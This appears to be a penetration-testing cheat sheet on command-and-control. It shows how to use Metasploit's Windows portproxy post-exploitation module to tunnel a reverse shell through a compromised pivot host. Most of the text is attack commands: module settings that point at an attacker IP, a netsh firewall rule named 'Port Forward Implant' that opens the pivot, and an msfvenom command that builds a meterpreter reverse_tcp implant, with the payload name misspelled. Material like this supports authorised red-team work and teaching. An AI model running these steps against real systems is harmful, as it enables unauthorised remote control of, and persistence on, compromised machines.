# C2 Frameworks

## 01 - Metasploit

```
msf > use post/windows/manage/portproxy

msf post(windows/manage/portproxy) > options

Module options (post/windows/manage/portproxy):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   CONNECT_ADDRESS                   yes       IPv4/IPv6 address to which to connect.
   CONNECT_PORT                      yes       Port number to which to connect.
   IPV6_XP          true             yes       Install IPv6 on Windows XP (needed for v4tov4).
   LOCAL_ADDRESS                     yes       IPv4/IPv6 address to which to listen.
   LOCAL_PORT                        yes       Port number to which to listen.
   SESSION                           yes       The session to run this module on
   TYPE             v4tov4           yes       Type of forwarding (Accepted: v4tov4, v6tov6, v6tov4, v4tov6)

msf post(windows/manage/portproxy) > set session <session_ID>

msf post(windows/manage/portproxy) > set connect_address <FHOST>

msf post(windows/manage/portproxy) > set connect_port <FPORT>

msf post(windows/manage/portproxy) > set local_address <LHOST>

msf post(windows/manage/portproxy) > set local_port <LPORT>

msf post(windows/manage/portproxy) > set type <v4tov4 | v6tov6 | v6tov4 | v4tov6>

msf post(windows/manage/portproxy) > set ipv6_xp <true | false>

msf post(windows/manage/portproxy) > run
```

### 1.1 - Scenarios

#### 1.1.1 - Remote Port Forwarding Reverse Shells

Port forward the reverse shell handler.

```
msf post(windows/manage/portproxy) > set session <session_ID>

msf post(windows/manage/portproxy) > set connect_address <attacker_IP>

msf post(windows/manage/portproxy) > set connect_port 8443

msf post(windows/manage/portproxy) > set local_address 0.0.0.0

msf post(windows/manage/portproxy) > set local_port 8443

msf post(windows/manage/portproxy) > set type v4tov4

msf post(windows/manage/portproxy) > run
```

In `meterpreter` interactive shell look for a listening port of 8443 under `LISTEN` state.

```
meterpreter > netstat
```

Add a firewall rule

```
meterpreter > shell

C:\> netsh advfirewall firewall add rule name="Port Forward Implant" protocol=tcp dir=in localip=<compromised_pivot_IP>  localport=8443 action=allow
```

Then you can launch a reverse shell handler. Just specify the compromised system's IP and PORT.

```
$ msfvenom -p windows/x64/metepreter/reverse_tcp lhost=<compromised_pivot_IP> lport=8443 -f exe -o implant.exe
```

---
## References

### pswalia4u

- [pswalia4u: Metasploit - Portproxy (tunneling meterpreter session inside another meterpreter session) + socat + chisel](https://pswalia2u.medium.com/metasploit-portproxy-tunneling-meterpreter-session-inside-another-meterpreter-session-9a99bcf959ac)